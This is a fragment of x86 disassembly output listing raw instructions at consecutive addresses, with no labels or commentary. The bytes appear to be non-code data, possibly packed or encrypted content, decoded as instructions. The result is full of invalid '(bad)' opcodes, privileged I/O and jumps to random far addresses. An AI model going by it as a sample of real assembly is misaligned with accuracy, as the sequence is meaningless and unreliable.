  4077a5:	dec    ebp
  4077a6:	sub    al,0xf0
  4077a8:	cmp    eax,0x5d64cd59
  4077ad:	or     DWORD PTR [edi-0x770c0fcf],eax
  4077b3:	jmp    0x407818
  4077b5:	xor    eax,0x44fcfb0c
  4077ba:	xchg   ah,dl
  4077bc:	xor    eax,edi
  4077be:	sub    al,0xa
  4077c0:	cdq    
  4077c1:	stos   BYTE PTR es:[edi],al
  4077c2:	(bad)  
  4077c3:	or     DWORD PTR [eax+0x4f],edi
  4077c6:	mov    WORD PTR [edi+0x36],cs
  4077c9:	fnstenv [ebp-0x6a]
  4077cc:	ds (bad) 
  4077ce:	pusha  
  4077cf:	jl     0x40777d
  4077d1:	sbb    eax,0x3afe4d2f
  4077d6:	dec    edx
  4077d7:	or     DWORD PTR [eax-0x62],ebp
  4077da:	or     al,0x9e
  4077dc:	je     0x407840
  4077de:	hlt    
  4077df:	dec    edx
  4077e0:	mov    ss,WORD PTR [ecx-0x2940704a]
  4077e6:	push   es
  4077e7:	xchg   esi,eax
  4077e8:	pop    eax
  4077e9:	inc    ebx
  4077ea:	cmp    ecx,DWORD PTR [eax]
  4077ec:	jns    0x407837
  4077ee:	cwde   
  4077ef:	xchg   edi,eax
  4077f0:	inc    edx
  4077f1:	lods   al,BYTE PTR ds:[esi]
  4077f2:	pop    ecx
  4077f3:	add    DWORD PTR [esi-0x5cde52c2],esp
  4077f9:	cmp    dl,BYTE PTR [esi]
  4077fb:	pushf  
  4077fc:	xchg   ecx,eax
  4077fd:	in     al,0x8b
  4077ff:	cdq    
  407800:	(bad)  
  407801:	sti    
  407802:	out    dx,al
  407803:	retf   0xdc9f
  407806:	or     DWORD PTR [eax+0x5f379a1e],eax
  40780c:	dec    ebp
  40780d:	ins    DWORD PTR es:[edi],dx
  40780e:	jge    0x4077ef
  407810:	sbb    dl,BYTE PTR [ecx+0x748736f6]
  407816:	fcomp  st(7)
  407818:	lods   al,BYTE PTR ds:[esi]
  407819:	mov    al,0x62
  40781b:	inc    esp
  40781c:	sbb    DWORD PTR [ebx+0x48dc5e77],0x41
  407823:	(bad)  
  407824:	js     0x4077ba
  407826:	push   ds
  407827:	inc    ecx
  407828:	inc    esi
  407829:	add    eax,0x31007a8
  40782e:	pop    eax
  40782f:	dec    edx
  407830:	sbb    al,0xd7
  407832:	or     eax,0x1a23ff49
  407837:	push   ebx
  407838:	repnz add al,0x49
  40783b:	pushw  ss
  40783d:	inc    edi
  40783e:	pop    eax
  40783f:	cmp    esp,DWORD PTR [ebx+eiz*8-0x10053cd9]
  407846:	push   0xbc01a295
  40784b:	and    eax,0x3b882f06
  407850:	sbb    BYTE PTR [edi+0x2db507ad],dh
  407856:	mov    edx,0x24c1d3e5
  40785b:	call   0x888ca8f9
  407860:	adc    DWORD PTR [eax],esi
  407862:	stos   DWORD PTR es:[edi],eax
  407863:	test   bl,cl
  407865:	mov    bh,0x47
  407867:	or     al,0xa8
  407869:	xchg   ebp,eax
  40786a:	aam    0x43
  40786c:	cli    
  40786d:	and    eax,0x377485f4
  407872:	pop    es
  407873:	and    ebx,0xf0e8146
  407879:	mov    edx,0xd435a8da
  40787e:	popa   
  40787f:	mov    edx,0xd5f538e0
  407884:	xor    BYTE PTR [edx],bl
  407886:	push   esp
  407887:	div    BYTE PTR [eax]
  407889:	das    
  40788a:	xlat   BYTE PTR ds:[ebx]
  40788b:	mov    cl,0xfb
  40788d:	push   esi
  40788e:	and    edx,ecx
  407890:	push   eax
  407891:	ja     0x40787c
  407893:	xor    esi,DWORD PTR [esi-0x56]
  407896:	xchg   dl,bl
  407898:	cmp    DWORD PTR [ecx*2-0x1b353321],edx
  40789f:	jle    0x407837
  4078a1:	js     0x407922
  4078a3:	jno    0x40791b
  4078a5:	mov    ebx,ebx
  4078a7:	pusha  
  4078a8:	out    0x13,eax
  4078aa:	popa   
  4078ab:	std    
  4078ac:	inc    esi
  4078ad:	mov    eax,ds:0xe34eda46
  4078b2:	ds jnp 0x4078af
  4078b5:	mov    al,ds:0xfeaa6c18
  4078ba:	mov    edi,0x3e2f40b5
  4078bf:	outs   dx,DWORD PTR ds:[esi]
  4078c0:	mov    ecx,0xdb0ec1f9
  4078c5:	push   ebx
  4078c6:	xchg   edi,eax
  4078c7:	ds fwait
  4078c9:	xor    DWORD PTR es:[edi-0x78],ebx
  4078cd:	call   0x707a4a07
  4078d2:	retf   0x5581
  4078d5:	sbb    esp,DWORD PTR [eax]
  4078d7:	cld    
  4078d8:	jo     0x4078a9
  4078da:	loopne 0x407927
  4078dc:	and    eax,0x61c65e25
  4078e1:	aam    0x45
  4078e3:	scas   al,BYTE PTR es:[edi]
  4078e4:	mov    ebx,0x9ff21b2b
  4078e9:	mov    ah,0xbe
  4078eb:	nop
  4078ec:	xchg   ebx,eax
  4078ed:	popa   
  4078ee:	pop    eax
  4078ef:	enter  0xdde1,0x5d
  4078f3:	cmp    BYTE PTR [eax-0x74],al
  4078f6:	pushf  
  4078f7:	mov    dh,0x30
  4078f9:	sbb    esp,edi
  4078fb:	mov    ebp,0xdf10b2f0
  407900:	pusha  
  407901:	jb     0x4078f9
  407903:	push   ecx
  407904:	jp     0x4078fa
  407906:	das    
  407907:	and    eax,0x1162f102
  40790c:	cmp    DWORD PTR [edi-0x21],edi
  40790f:	mov    ah,0x8b
  407911:	retf   
  407912:	dec    BYTE PTR ss:[ebx-0x279177a5]
  407919:	jecxz  0x407927
  40791b:	sub    al,al
  40791d:	inc    eax
  40791e:	push   es
  40791f:	aad    0x48
  407921:	adc    al,0xc5
  407923:	xor    esp,DWORD PTR [esp+eiz*2]
  407926:	aad    0xc5
  407928:	and    BYTE PTR [ebp-0x6b],ch
  40792b:	push   DWORD PTR [edx+0x34fe6174]
  407931:	(bad)  [eax]
  407933:	add    al,cl
  407935:	mov    ebp,0x6fe94b74
  40793a:	dec    edi
  40793b:	cmp    eax,0xfc36bb34
  407940:	xchg   ebx,eax
  407941:	add    ebp,eax
  407943:	mov    eax,ds:0x7fb569ff
  407948:	xor    ebp,0x5c
  40794b:	fsub   DWORD PTR [ecx+edi*4-0x69ca0d2d]
  407952:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407953:	shl    DWORD PTR [ebp-0x751608f],0xba
  40795a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40795b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40795c:	mov    ebp,0x83fed57c
  407961:	jl     0x407990
  407963:	(bad)  
  407964:	jae    0x40794b
  407966:	in     eax,dx
  407967:	call   0xac284f45
  40796c:	and    al,0xb9
  40796e:	lahf   
  40796f:	push   0xffffff84
  407971:	and    eax,0xfe98fa9a
  407976:	xor    edx,DWORD PTR [eax-0x484c7e2f]
  40797c:	mov    ch,0x67
  40797e:	out    dx,al
  40797f:	out    dx,eax
  407980:	and    cl,BYTE PTR [esi+esi*4]
  407983:	fcmove st,st(7)
  407985:	call   0xf08a:0x2d673376
  40798c:	add    al,0x23
  40798e:	pushf  
  40798f:	mov    dl,cl
  407991:	sbb    BYTE PTR [edi+0x3e],dl
  407994:	xor    al,0x13
  407996:	mov    edi,ebp
  407998:	in     eax,0x46
  40799a:	icebp  
  40799b:	adc    eax,0xbb787f06
  4079a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4079a1:	add    al,0xf1
  4079a3:	adc    dh,0x3e
  4079a6:	or     eax,0xdf8d8300
  4079ab:	mov    esp,0x404e5287
  4079b0:	mov    bh,0x48
  4079b2:	pop    ebp
  4079b3:	mov    al,ds:0x8bebab64
  4079b8:	js     0x407960
  4079ba:	cdq    
  4079bb:	push   ss
  4079bc:	pop    ebx
  4079bd:	or     eax,0xc592536a
  4079c2:	icebp  
  4079c3:	lahf   
  4079c4:	outs   dx,BYTE PTR ds:[esi]
  4079c5:	ret    0x4400
  4079c8:	or     eax,0xc94d4fb0
  4079cd:	out    dx,al
  4079ce:	and    esi,DWORD PTR ds:0xb1ba5f48
  4079d4:	stos   BYTE PTR es:[edi],al
  4079d5:	imul   eax,DWORD PTR [ebp-0x6fd06338],0x80873513
  4079df:	jle    0x407a03
  4079e1:	bound  ebx,QWORD PTR [ebx]
  4079e3:	add    DWORD PTR [edx],esp
  4079e5:	call   0x1572:0xea336cd8
  4079ec:	add    DWORD PTR [esi+0x40],ecx
  4079ef:	cwde   
  4079f0:	push   eax
  4079f1:	push   edi
  4079f3:	xchg   edi,ebp
  4079f5:	fisubr WORD PTR ds:0xfb2756f
  4079fb:	inc    ebp
  4079fc:	(bad)  
  4079fd:	(bad)  [esp+esi*4+0x5e]
  407a01:	sahf   
  407a02:	dec    eax
  407a03:	aad    0x96
  407a05:	xor    ch,BYTE PTR [esi-0xa6ca5b1]
  407a0b:	add    eax,0xa38794bf
  407a10:	jo     0x4079ec
  407a12:	push   cs
  407a13:	sub    edi,DWORD PTR [edx+ebp*1+0x72]
  407a17:	setb   BYTE PTR ds:0x24987805
  407a1e:	adc    BYTE PTR [edx+0x32217038],cl
  407a24:	xor    esp,0x9f5a2037
  407a2a:	sahf   
  407a2b:	repz cdq 
  407a2d:	push   eax
  407a2e:	repnz mov ebx,0xf7b99b7f
  407a34:	mov    DWORD PTR [edx-0x1e],esp
  407a37:	(bad)  
  407a38:	in     al,0x69
  407a3a:	inc    edx
  407a3b:	adc    edx,ebx
  407a3d:	(bad)  
  407a3e:	(bad)  
  407a3f:	xor    al,0xd1
  407a41:	or     DWORD PTR [ecx+0x13],eax
  407a44:	je     0x407a84
  407a46:	jge    0x407a3e
  407a48:	jns    0x407a53
  407a4a:	cmpps  xmm5,XMMWORD PTR [ebp-0x55],0x76
  407a4f:	div    BYTE PTR ds:0xaecd68e5
  407a55:	cwde   
  407a56:	push   eax
  407a57:	and    al,0xd7
  407a59:	pop    ss
  407a5a:	mov    edi,0xf724f082
  407a60:	xchg   ebp,eax
  407a61:	cwde   
  407a62:	popa   
  407a63:	dec    ebp
  407a64:	and    BYTE PTR [edx],bl
  407a66:	cmp    BYTE PTR [ebx],bl
  407a68:	jbe    0x407a50
  407a6a:	pop    eax
  407a6b:	ja     0x407ab7
  407a6d:	cmp    ecx,DWORD PTR [eax-0x35]
  407a70:	jge    0x407a13
  407a72:	or     eax,0x55821015
  407a77:	add    esp,DWORD PTR [edx-0x55be7c30]
  407a7d:	and    ch,dl
  407a7f:	xchg   edx,edi
  407a81:	scas   eax,DWORD PTR es:[edi]
  407a82:	mov    edi,0x7b778828
  407a87:	pushf  
  407a88:	jnp    0x407b01
  407a8a:	aas    
  407a8b:	(bad)  
  407a8d:	mov    esi,0x987510f9
  407a92:	iret   
  407a93:	adc    al,0xdf
  407a95:	sbb    eax,0x1e998d69
  407a9a:	sbb    edx,ebx
  407a9c:	pop    es
  407a9d:	nop
  407a9e:	mov    esi,0x7057af67
  407aa3:	repnz retf 
  407aa5:	jl     0x407b1e
  407aa7:	into   
  407aa8:	ret    0x9e82
  407aab:	xor    esi,DWORD PTR [ecx+0x72ddd684]
  407ab1:	xchg   BYTE PTR [ebx+0x64f625cb],dh
  407ab7:	mov    dl,0x6f
  407ab9:	outs   dx,DWORD PTR ds:[esi]
  407aba:	cmp    al,0x69
  407abc:	xor    DWORD PTR [ebp-0x3a],ecx
  407abf:	es cmp al,0x62
  407ac2:	xchg   esp,eax
  407ac3:	shl    eax,0xce
  407ac6:	xor    eax,0x4063304c
  407acb:	fsubr  QWORD PTR [ecx-0x51]
  407ace:	test   eax,0x9da652da
  407ad3:	je     0x407ab7
  407ad5:	or     eax,ebx
  407ad7:	inc    ebx
  407ad8:	pushf  
  407ad9:	out    0xc,eax
  407adb:	(bad)  
  407adc:	and    BYTE PTR [ecx+0x13],ch
  407adf:	stos   BYTE PTR es:[edi],al
  407ae0:	sar    DWORD PTR [ebp-0x5ecc043b],cl
  407ae6:	sub    BYTE PTR [ebx-0x2c7be403],0x6e
  407aed:	not    BYTE PTR [edi-0x70273621]
  407af3:	std    
  407af4:	adc    BYTE PTR [esp+eiz*2],ah
  407af7:	cmp    eax,0xe600470a
  407afc:	fdivr  DWORD PTR [esi-0x4cd981a2]
  407b02:	lock inc eax
  407b04:	mov    dh,0x2a
  407b06:	fldcw  WORD PTR [edx+0x59]
  407b09:	stos   DWORD PTR es:[edi],eax
  407b0a:	cmp    eax,0x3e1660a9
  407b0f:	scas   al,BYTE PTR es:[edi]
  407b10:	mov    al,ds:0xcfa883ab
  407b15:	es jb  0x407a9e
  407b18:	dec    esp
  407b19:	aad    0x84
  407b1b:	cmp    esp,DWORD PTR [ecx-0x40]
  407b1e:	xchg   BYTE PTR [edi],ch
  407b20:	(bad)  
  407b21:	mov    dl,0x1e
  407b23:	add    eax,DWORD PTR [ecx]
  407b25:	aam    0x35
  407b27:	into   
  407b28:	inc    esi
  407b29:	shl    BYTE PTR fs:[eax+0x78e3e933],1
  407b30:	sbb    eax,0x523ff27c
  407b35:	out    dx,al
  407b36:	cmp    al,0x51
  407b38:	sbb    BYTE PTR [edx],ah
  407b3a:	mov    ah,0xc5
  407b3c:	mov    ebx,0x2fbf1e40
  407b41:	cs sti 
  407b43:	push   cs
  407b44:	mov    bl,0x7
  407b46:	push   0xffffffb1
  407b48:	pop    es
  407b49:	mov    bl,0x8a
  407b4b:	cdq    
  407b4c:	dec    esp
  407b4d:	fsubr  st,st(6)
  407b4f:	jle    0x407b8a
  407b51:	repz xchg edi,eax
  407b53:	cmp    DWORD PTR [eax+0xa76dc64],ecx
  407b59:	ss pusha 
  407b5b:	cli    
  407b5c:	ins    BYTE PTR es:[edi],dx
  407b5d:	or     ch,BYTE PTR [esi+eiz*4-0x680e7ea4]
  407b64:	jnp    0x407b53
  407b66:	mov    DWORD PTR [ecx],eax
  407b68:	mov    al,ds:0x40bb21df
  407b6d:	push   ss
  407b6e:	sub    BYTE PTR [esi-0x69],bl
  407b71:	(bad)  
  407b72:	push   edi
  407b73:	mov    eax,0x6c8bb043
  407b78:	rcr    BYTE PTR [eax],0x64
  407b7b:	mov    bh,0x72
  407b7d:	call   0xa19d:0xa923a3a3
  407b84:	out    dx,al
  407b85:	out    0x2,eax
  407b87:	aaa    
  407b88:	pop    ebx
  407b89:	pop    esp
  407b8a:	loop   0x407b9c
  407b8c:	jne    0x407bf4
  407b8e:	add    DWORD PTR [ebp+0x661e7ab4],ecx
  407b94:	adc    al,0x80
  407b96:	jp     0x407b64
  407b98:	les    edi,FWORD PTR [ecx-0x241d3282]
  407b9e:	imul   ebx,DWORD PTR [edi+0x55ede8e8],0x267a2c15
  407ba8:	mov    ah,0xe0
  407baa:	push   ecx
  407bab:	xor    eax,0xa78adf16
  407bb0:	or     BYTE PTR [edx],bl
  407bb2:	mov    cs,WORD PTR fs:[ecx]
  407bb5:	dec    ebp
  407bb6:	or     DWORD PTR [eax+0x7],esp
  407bb9:	retf   0xa8de
  407bbc:	ja     0x407bd4
  407bbe:	test   al,0xe
  407bc0:	mov    edx,0x1efafe56
  407bc5:	lods   al,BYTE PTR ds:[esi]
  407bc6:	mov    edx,0xae9f5ddd
  407bcb:	push   esp
  407bcc:	loope  0x407bfd
  407bce:	sar    BYTE PTR [edi+0x52],1
  407bd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407bd2:	pop    ebp
  407bd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407bd4:	sub    ecx,esp
  407bd6:	and    al,0xc4
  407bd8:	sub    al,0xc
  407bda:	dec    edx
  407bdb:	push   ebx
  407bdc:	(bad)  
  407bdd:	aam    0x9d
  407bdf:	dec    DWORD PTR [ebp+0x32]
  407be2:	fistp  QWORD PTR [ecx-0x6d54c224]
  407be8:	es or  edx,0xa2277452
  407bef:	js     0x407b7a
  407bf1:	sti    
  407bf2:	sub    esi,DWORD PTR [edx-0x29f348c9]
  407bf8:	call   DWORD PTR [ebp-0x41]
  407bfb:	mov    ds:0x5e606ad4,eax
  407c00:	mov    eax,0x429c0378
  407c05:	push   edx
  407c06:	test   BYTE PTR [ebx+0x1f56fcbc],bl
  407c0c:	cmp    DWORD PTR [ebx-0x4da8240c],ebx
  407c12:	mov    ah,0xe9
  407c14:	mov    ds:0x2ceb8c49,eax
  407c19:	jmp    0x2fd8570f
  407c1e:	jns    0x407ba1
  407c20:	adc    al,0x82
  407c22:	cs push ecx
  407c24:	test   al,0x23
  407c26:	jne    0x407baf
  407c28:	in     eax,0xe
  407c2a:	inc    ebp
  407c2b:	jmp    0x8e8f:0x15afe88d
  407c32:	inc    eax
  407c33:	aam    0xe2
  407c35:	mov    dl,0x9e
  407c37:	inc    eax
  407c38:	jg     0x407c52
  407c3a:	and    al,0x7e
  407c3c:	es push edi
  407c3e:	adc    eax,0xc0cbeb27
  407c43:	or     eax,0x11f85b57
  407c48:	stos   BYTE PTR es:[edi],al
  407c49:	ins    BYTE PTR es:[edi],dx
  407c4a:	push   0xffffffb2
  407c4c:	aas    
  407c4d:	scas   eax,DWORD PTR es:[edi]
  407c4e:	out    dx,eax
  407c4f:	fidiv  DWORD PTR [ecx]
  407c51:	inc    ecx
  407c52:	or     ebp,DWORD PTR [eax+0x65d636d3]
  407c58:	pushf  
  407c59:	jnp    0x407c26
  407c5b:	and    edi,ebp
  407c5d:	adc    eax,0x5d0bed10
  407c62:	test   eax,0xfe5ade9f
  407c67:	xchg   DWORD PTR [eax+0x7d],edx
  407c6a:	adc    DWORD PTR [esi],edi
  407c6c:	int    0x51
  407c6e:	pop    es
  407c6f:	outs   dx,BYTE PTR ds:[esi]
  407c70:	mov    edi,0xb21120ec
  407c75:	or     al,0x5d
  407c77:	dec    eax
  407c78:	and    eax,0xf79e85e4
  407c7d:	aad    0xd7
  407c7f:	scas   al,BYTE PTR es:[edi]
  407c80:	jnp    0xd481b68f
  407c86:	addr16 (bad) 
  407c89:	clc    
  407c8a:	jb     0x407c0f
  407c8c:	(bad)  
  407c8d:	cld    
  407c8e:	mov    al,cl
  407c90:	fcomip st,st(2)
  407c92:	pop    ss
  407c93:	cmp    esi,DWORD PTR [ebp-0x440511a7]
  407c99:	mov    ds:0x2b8b88a3,eax
  407c9e:	and    dh,BYTE PTR [edi]
  407ca0:	mov    eax,0xaf09f200
  407ca5:	cli    
  407ca6:	jo     0x407ca8
  407ca8:	pop    esp
  407ca9:	push   ds
  407caa:	adc    esp,esp
  407cac:	out    0x37,al
  407cae:	push   edi
  407caf:	xchg   ebx,eax
  407cb0:	retf   
  407cb1:	sub    ebx,edi
  407cb3:	popf   
  407cb4:	xor    DWORD PTR [edi+0x26308235],edx
  407cba:	hlt    
  407cbb:	shr    DWORD PTR [esp+eiz*8+0x1a54e4c1],1
  407cc2:	inc    esp
  407cc3:	call   0x8dbf:0x672bdb2b
  407cca:	xchg   ecx,eax
  407ccb:	xchg   esp,eax
  407ccc:	push   ebx
  407ccd:	and    esi,DWORD PTR [edx-0x32f45dd9]
  407cd3:	push   es
  407cd4:	dec    esp
  407cd5:	inc    esp
  407cd6:	xchg   ebp,eax
  407cd7:	jp     0x407c86
  407cd9:	adc    eax,0x3197ff1f
  407cde:	inc    ebx
  407cdf:	mov    bl,0xd4
  407ce1:	into   
  407ce2:	inc    ebx
  407ce3:	loop   0x407d40
  407ce5:	test   al,0x68
  407ce7:	int    0x16
  407ce9:	pop    ebx
  407cea:	jecxz  0x407ccd
  407cec:	xor    DWORD PTR [edx+ebp*2],esi
  407cef:	xor    al,0xd5
  407cf1:	dec    ecx
  407cf2:	mov    bh,0xdd
  407cf4:	xor    BYTE PTR [esi-0x6bec3aa0],dh
  407cfa:	in     al,0xec
  407cfc:	dec    edi
  407cfd:	cmp    BYTE PTR [ebx],ch
  407cff:	xchg   edi,eax
  407d00:	(bad)  
  407d01:	inc    esp
  407d02:	ffreep st(7)
  407d04:	mov    eax,es:0x68279c61
  407d0a:	and    DWORD PTR [edi+0x710da580],edx
  407d10:	outs   dx,BYTE PTR ds:[esi]
  407d11:	jmp    0xbf1d6991
  407d16:	sar    DWORD PTR [ebp+0x62d41d9],0xc7
  407d1d:	or     al,BYTE PTR [ebp+0x50]
  407d20:	jge    0x407cd2
  407d22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d23:	rol    ah,0x9f
  407d26:	mov    ebp,cs
  407d28:	jmp    0x407d51
  407d2a:	test   DWORD PTR [esi],ecx
  407d2c:	push   0x8a738695
  407d31:	sti    
  407d32:	jl     0x407d2f
  407d34:	fisttp QWORD PTR [ecx-0x136d6607]
  407d3a:	add    eax,0x5465bdfa
  407d3f:	or     bh,bh
  407d41:	pop    ebx
  407d42:	jg     0x407d13
  407d44:	or     eax,edi
  407d46:	push   edx
  407d47:	xor    al,0x9a
  407d49:	test   eax,0x39e8c14c
  407d4e:	icebp  
  407d4f:	cmp    al,0x7f
  407d51:	push   edx
  407d52:	mov    BYTE PTR [edx+0x67a0c869],ch
  407d58:	pop    esp
  407d59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d5a:	pusha  
  407d5b:	sbb    BYTE PTR [edi],al
  407d5d:	out    dx,al
  407d5e:	mov    esi,0x39a276f6
  407d63:	popa   
  407d64:	xchg   ecx,eax
  407d65:	mov    eax,ds:0xf5db3853
  407d6a:	dec    eax
  407d6b:	scas   eax,DWORD PTR es:[edi]
  407d6c:	fist   WORD PTR [ebx+0x2f223100]
  407d72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d73:	sub    eax,DWORD PTR [edi-0x44]
  407d76:	add    BYTE PTR [edx+eax*2-0x61d0a656],0xa1
  407d7e:	inc    eax
  407d7f:	xchg   DWORD PTR [ecx-0x65],esp
  407d82:	mov    cl,0x16
  407d84:	lods   al,BYTE PTR ds:[esi]
  407d85:	cmp    al,0xda
  407d87:	jbe    0x407d81
  407d89:	icebp  
  407d8a:	adc    eax,0x9ef1afea
  407d8f:	ds cdq 
  407d91:	jmp    0x407d2a
  407d93:	scas   al,BYTE PTR es:[edi]
  407d94:	ret    
  407d95:	xchg   ebp,eax
  407d96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d97:	dec    esp
  407d98:	sub    al,BYTE PTR [eax]
  407d9a:	mov    ds,WORD PTR [eax+0x4dc31df5]
  407da0:	lds    ebx,FWORD PTR [eax+0x64]
  407da3:	inc    DWORD PTR [edx]
  407da5:	sub    BYTE PTR [ebp-0x22],bh
  407da8:	mov    dh,0x5
  407daa:	or     DWORD PTR [esi+0x4b71f56c],ebp
  407db0:	sahf   
  407db1:	cwde   
  407db2:	gs jg  0x407d6a
  407db5:	push   edx
  407db6:	enter  0xa163,0x30
  407dba:	jmp    0x407e0e
  407dbc:	mov    dh,0x3
  407dbe:	jmp    FWORD PTR [ecx]
  407dc0:	sbb    eax,0x2a961da5
  407dc5:	nop
  407dc6:	clc    
  407dc7:	lock test ecx,0x7b14f3a
  407dce:	push   0xffffffb3
  407dd0:	adc    bh,dl
  407dd2:	xchg   esp,eax
  407dd3:	lods   eax,DWORD PTR ds:[esi]
  407dd4:	mov    ds,WORD PTR [edx+0x2b]
  407dd7:	mov    WORD PTR [ecx+0x2],ds
  407dda:	js     0x407da7
  407ddc:	push   0xffffff82
  407dde:	mov    ebx,0xb443bd98
  407de3:	call   FWORD PTR [ebx]
  407de5:	mov    cl,0x8f
  407de7:	in     al,dx
  407de8:	mov    ebp,DWORD PTR [eax+eiz*1]
  407deb:	jg     0x407e04
  407ded:	or     DWORD PTR [ebx+eax*2],esp
  407df0:	mov    cl,0x6d
  407df2:	nop
  407df3:	repnz das 
  407df5:	std    
  407df6:	fs (bad) 
  407df8:	mov    DWORD PTR [ecx+eiz*1],ebx
  407dfb:	pop    ebp
  407dfc:	xor    DWORD PTR [edx+ecx*8+0x4e],edx
  407e00:	xor    bl,BYTE PTR [esi-0x51]
  407e03:	mov    ebx,0xfc7efcee
  407e08:	mov    bl,0x21
  407e0a:	rcr    DWORD PTR [edx+0x53],cl
  407e0d:	sub    ebp,DWORD PTR [ecx+edi*8-0x18b80d48]
  407e14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e15:	sahf   
  407e16:	in     eax,dx
  407e17:	out    0xae,al
  407e19:	mov    ch,0x32
  407e1b:	xchg   DWORD PTR [edi-0x31353948],edi
  407e21:	mov    dh,0x42
  407e23:	(bad)  
  407e24:	and    BYTE PTR [eax+0x25f678d5],ch
  407e2a:	dec    eax
  407e2b:	das    
  407e2c:	sbb    bh,dl
  407e2e:	mov    ah,0x60
  407e30:	adc    DWORD PTR [eax-0x51],ebp
  407e33:	cwde   
  407e34:	push   es
  407e35:	fdiv   QWORD PTR [eax+edx*1+0x6c]
  407e39:	aam    0x21
  407e3b:	ficomp WORD PTR [eax]
  407e3d:	idiv   DWORD PTR [edi+0x26]
  407e40:	shr    BYTE PTR [eax-0x6],1
  407e43:	cmp    eax,0x271f8723
  407e48:	sub    eax,ecx
  407e4a:	retf   0x5a0a
  407e4d:	js     0x407e1d
  407e4f:	pop    eax
  407e50:	and    edx,DWORD PTR [ebx+0xc]
  407e53:	pop    ebp
  407e54:	mov    bh,BYTE PTR [edx+0x19d2d78c]
  407e5a:	pop    es
  407e5b:	xchg   edx,eax
  407e5c:	push   esi
  407e5d:	arpl   bp,cx
  407e5f:	bound  ebp,QWORD PTR [edx-0x56]
  407e62:	jecxz  0x407df6
  407e64:	arpl   si,dx
  407e66:	(bad)  
  407e67:	clc    
  407e68:	push   ebx
  407e69:	fucomp st(7)
  407e6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e6c:	dec    esi
  407e6d:	sti    
  407e6e:	push   eax
  407e6f:	cdq    
  407e70:	repz jno 0x407ee6
  407e73:	(bad)  
  407e74:	mov    eax,ds:0x72789cbd
  407e79:	hlt    
  407e7a:	les    eax,FWORD PTR [edi-0xbb6dc02]
  407e80:	enter  0x6759,0x66
  407e84:	test   eax,0x43af394
  407e89:	out    dx,al
  407e8a:	xchg   DWORD PTR [edi+0x581118e8],eax
  407e90:	lods   al,BYTE PTR ds:[esi]
  407e91:	leave  
  407e92:	sub    DWORD PTR [esi+ebp*1],eax
  407e95:	out    0xd8,eax
  407e97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e98:	jecxz  0x407e1c
  407e9a:	stos   BYTE PTR es:[edi],al
  407e9b:	cmp    al,0x51
  407e9d:	test   al,0x1b
  407e9f:	mov    ds:0x15b68c5f,al
  407ea4:	and    al,0x82
  407ea6:	in     al,dx
  407ea7:	sbb    ch,bl
  407ea9:	cld    
  407eaa:	pop    ebp
  407eab:	repnz xor eax,0x62373c27
  407eb1:	inc    eax
  407eb2:	mov    ds,WORD PTR [ecx+edi*8-0x7a]
  407eb6:	jge    0x407ea4
  407eb8:	mov    ds:0xa21a73c6,eax
  407ebd:	(bad)  
  407ebe:	test   ah,0xb8
  407ec1:	lods   ax,WORD PTR ds:[esi]
  407ec3:	(bad)  
  407ec4:	mov    ecx,0x5bbff281
  407ec9:	push   edi
  407eca:	push   edx
  407ecb:	aam    0x3b
  407ecd:	cmp    esp,ecx
  407ecf:	sub    al,0xc4
  407ed1:	push   ebx
  407ed2:	jmp    0xc7f35689
  407ed7:	in     al,dx
  407ed8:	imul   eax,esi,0xffffff88
  407edb:	xor    al,BYTE PTR [edx+edi*4]
  407ede:	(bad)  
  407edf:	(bad)
  407ee4:	push   es
  407ee5:	pop    ss
  407ee6:	sub    eax,0xfe7542f4
  407eeb:	jle    0x407ecd
  407eed:	(bad)
  407ef1:	push   ebp
  407ef2:	jecxz  0x407f71
  407ef4:	fs xchg ecx,eax
  407ef6:	aas    
  407ef7:	rcl    BYTE PTR [ecx-0x776726db],1
  407efd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407efe:	jb     0x407f0c
  407f00:	add    dh,ch
  407f02:	es loopne 0x407ee7
  407f05:	imul   eax,DWORD PTR [esi-0x17d0ccff],0xfffffff7
  407f0c:	js     0x407eec
  407f0e:	pop    ss
  407f0f:	pop    esi
  407f10:	jg     0x407f8c
  407f12:	dec    ebx
  407f13:	inc    ebp
  407f14:	shl    DWORD PTR [edi-0x46dfc72c],cl
  407f1a:	cmc    
  407f1b:	jecxz  0x407ea4
  407f1d:	retf   
  407f1e:	and    al,0x62
  407f20:	in     al,0x55
  407f22:	xchg   ebp,eax
  407f23:	fsubr  DWORD PTR [esp+edi*1+0x3]
  407f27:	shl    ecx,cl
  407f29:	fwait
  407f2a:	cmp    al,0x2
  407f2c:	mov    ds:0x7ac75871,al
  407f31:	sbb    eax,0x6503f358
  407f36:	cwde   
  407f37:	mov    al,ds:0x11826924
  407f3c:	lock jne 0x407f2b
  407f3f:	dec    edx
  407f40:	ficomp DWORD PTR ss:0x11170b02
  407f47:	jo     0x407ef1
  407f49:	xchg   BYTE PTR [eax+0x2d],dh
  407f4c:	icebp  
  407f4d:	outs   dx,DWORD PTR ds:[esi]
  407f4e:	mov    ds:0xe9d320ff,al
  407f53:	jmp    0x32a2521a
  407f58:	nop
  407f59:	xchg   edi,eax
  407f5a:	out    0xfd,al
  407f5c:	push   ecx
  407f5d:	mov    ch,0x61
  407f5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f60:	ss hlt 
  407f62:	inc    edx
  407f63:	dec    ebp
  407f64:	jae    0x407f45
  407f66:	jecxz  0x407f11
  407f68:	imul   edi,esi,0x7c
  407f6b:	frstor [ecx]
  407f6d:	inc    edx
  407f6e:	aad    0x29
  407f70:	inc    esp
  407f71:	in     al,0xaf
  407f73:	in     eax,0x18
  407f75:	and    BYTE PTR [esi-0x1b33e72d],al
  407f7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f7c:	imul   eax,esp,0xe9728293
